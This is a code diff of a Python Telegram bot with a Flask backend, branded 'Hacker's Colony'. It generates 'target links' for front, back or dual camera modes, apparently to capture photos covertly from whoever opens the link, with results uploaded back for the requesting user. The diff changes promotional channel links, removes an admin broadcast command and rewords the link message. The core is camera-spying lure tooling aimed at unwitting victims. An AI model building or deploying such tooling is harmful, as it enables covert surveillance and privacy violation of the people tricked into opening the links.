@@ -8,8 +8,8 @@ app = Flask(__name__)
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 APP_URL = "https://happy-wishing-you.onrender.com" 
 ADMINS = [518067190, 7162565886]
-TG_CHANNEL = "https://t.me/HackersColony"
-YT_LINK = "https://youtube.com/@hackers_colony_tech?si=W2r1_Su7wPvnfy2u"
+TG_CHANNEL = "https://t.me/hackerscolonytech"
+YT_LINK = "https://youtube.com/@hackers_colony_tech?si=ao7sXsZt8OLAj1Lc"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -21,9 +21,6 @@ def db_init():
     conn.close()
 
 db_init()
-
-bot.remove_webhook()
-time.sleep(2)
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -41,43 +38,19 @@ def start(message):
     )
     bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>\n\n⚠️ <b>Must join our channel and subscribe to our YouTube to use this bot!</b>", parse_mode='HTML', reply_markup=markup)
 
-@bot.message_handler(commands=['send'])
-def broadcast(message):
-    if message.chat.id in ADMINS:
-        msg_text = message.text.replace('/send ', '')
-        if msg_text == '/send':
-            bot.reply_to(message, "Usage: /send Your Message")
-            return
-        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
-        cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
-        success = 0
-        for user in users:
-            try: bot.send_message(user[0], msg_text); success += 1
-            except: pass
-        bot.reply_to(message, f"🎯 Broadcast sent to {success} users.")
-
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     if call.data == "check_join":
         markup = types.InlineKeyboardMarkup()
-        btn1 = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
-        btn2 = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
-        markup.row(btn1, btn2)
+        markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
         markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
         markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
-        bot.edit_message_text("<b>Select your camera mode to hack Camera 📸:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
+        bot.edit_message_text("<b>Select your camera mode:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
-        # Link generation fixed to avoid Context Error
         target_link = f"{APP_URL}/?m={mode}&uid={call.message.chat.id}"
-        
-        response_text = (
-            f"🤠 It's your target link 🔗\n\n"
-            f"Url = ( {target_link} )\n\n"
-            f"✨ Thank you team HCO ✨"
-        )
-        bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)
+        bot.send_message(call.message.chat.id, f"<b>🤠 Your target link 🔗</b>\n\nUrl = {target_link}\n\n✨ Thank you team HCO ✨", parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
 def index():
@@ -101,6 +74,8 @@ def upload():
 
 if __name__ == "__main__":
     def run_bot():
+        bot.remove_webhook()
+        time.sleep(2)
         while True:
             try: bot.polling(none_stop=True)
             except: time.sleep(5)
